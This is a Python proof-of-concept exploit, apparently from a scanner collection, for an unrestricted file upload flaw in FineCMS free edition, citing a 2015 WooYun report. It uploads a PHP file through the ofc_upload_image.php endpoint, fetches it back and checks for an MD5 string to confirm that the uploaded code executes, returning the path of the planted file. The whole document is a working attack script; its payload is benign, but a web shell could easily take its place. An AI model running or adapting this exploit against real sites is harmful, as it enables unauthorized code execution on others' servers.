#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: FineCMS免费版文件上传漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0105251
author: Lucifer
description: FineCMS上传页面无限制,可以上传任意文件。
'''
import sys
import random
import requests
import warnings
def run(url):
        result = ['FineCMS免费版文件上传漏洞', '', '']
        headers = {
            "Content-Type":"application/oct",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/dayrui/libraries/Chart/ofc_upload_image.php?name="
        post_data = '''<?print(md5(1234));?>'''
        filename = "test" + str(random.randrange(1000,9999)) + ".php"
        vulnurl = url + payload + filename
        shellpath = url + "/dayrui/libraries/tmp-upload-images/"+filename
        try:
            req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
            req2 = requests.get(shellpath, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                result[2]=  '存在'
                result[1] = shellpath
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    